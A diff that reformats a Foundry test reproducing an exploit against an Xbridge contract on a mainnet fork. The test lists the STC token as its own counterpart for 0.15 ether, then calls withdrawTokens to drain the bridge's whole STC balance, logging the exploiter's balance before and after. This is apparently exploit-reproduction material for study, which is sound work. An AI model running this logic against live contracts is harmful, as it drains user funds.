@@ -18,47 +18,37 @@ interface IXbridge {
         address token;
         uint256 chain;
     }
-    function listToken(tokenInfo memory baseToken, tokenInfo memory correspondingToken, bool _isMintable) external payable;
-    function withdrawTokens(address token, address receiver, uint256 amount) external; 
 
+    function listToken(
+        tokenInfo memory baseToken,
+        tokenInfo memory correspondingToken,
+        bool _isMintable
+    ) external payable;
+    function withdrawTokens(address token, address receiver, uint256 amount) external;
 }
 
-
 contract ContractTest is Test {
-
     IERC20 STC = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);
     IXbridge xbridge = IXbridge(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31);
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19723701 - 1);
+        vm.createSelectFork("mainnet", 19_723_701 - 1);
     }
 
     function testExploit() public {
         // First TX
         deal(address(this), 0.15 ether);
-        emit log_named_decimal_uint(
-            "Exploiter STC balance before attack",
-            STC.balanceOf(address(this)),
-            9
-        );
+        emit log_named_decimal_uint("Exploiter STC balance before attack", STC.balanceOf(address(this)), 9);
 
-        IXbridge.tokenInfo memory base = IXbridge.tokenInfo(address(STC), 85936);
-        IXbridge.tokenInfo memory corr = IXbridge.tokenInfo(address(STC), 95838);
+        IXbridge.tokenInfo memory base = IXbridge.tokenInfo(address(STC), 85_936);
+        IXbridge.tokenInfo memory corr = IXbridge.tokenInfo(address(STC), 95_838);
 
         xbridge.listToken{value: 0.15 ether}(base, corr, false);
 
         xbridge.withdrawTokens(address(STC), address(this), STC.balanceOf(address(xbridge)));
 
-        emit log_named_decimal_uint(
-            "Exploiter STC balance after attack",
-            STC.balanceOf(address(this)),
-            9
-        );
-
+        emit log_named_decimal_uint("Exploiter STC balance after attack", STC.balanceOf(address(this)), 9);
     }
 
     receive() external payable {}
-
 }
-
-
